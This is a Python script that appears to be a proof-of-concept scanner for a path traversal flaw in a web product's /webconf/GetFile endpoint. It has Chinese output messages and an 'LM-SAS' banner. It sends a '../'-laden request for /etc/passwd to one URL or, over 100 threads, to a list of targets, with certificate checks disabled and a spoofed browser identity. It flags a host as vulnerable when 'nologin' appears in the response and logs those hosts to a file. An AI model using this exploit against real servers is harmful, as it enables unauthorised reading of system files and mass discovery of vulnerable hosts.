import requests
import argparse
import sys,urllib3
from multiprocessing.dummy import Pool
from termcolor import colored           #导入颜色库
urllib3.disable_warnings()              #抑制警告

def banner():
    demo = """
██╗     ███╗   ███╗      ███████╗ █████╗ ███████╗
██║     ████╗ ████║      ██╔════╝██╔══██╗██╔════╝
██║     ██╔████╔██║█████╗███████╗███████║███████╗
██║     ██║╚██╔╝██║╚════╝╚════██║██╔══██║╚════██║
███████╗██║ ╚═╝ ██║      ███████║██║  ██║███████║
╚══════╝╚═╝     ╚═╝      ╚══════╝╚═╝  ╚═╝╚══════╝
                                                 """
    colored_demo = colored(demo, 'blue')
    print(colored_demo)

def main():
    parser = argparse.ArgumentParser(description="welcome to use!")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        with open(args.file, 'r', encoding='utf-8') as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")

def poc(target):
    payload = '/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
    headers = {
        'Cache-Control':'max-age=0',
        'Sec-Ch-Ua':'"Not/A)Brand";v="8","Chromium";v="126","GoogleChrome";v="126"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/126.0.0.0Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Priority':'u=0,i',
        'Connection':'close',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        if 'nologin' in res.text:
            print(f'[+]{target}存在漏洞')
            with open('result-LM.txt', 'a', encoding='utf-8') as ff:
                ff.write(f'[+]{target}存在漏洞' + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception:
        print(f"{target}该站点存在问题!")

if __name__ == '__main__':
    main()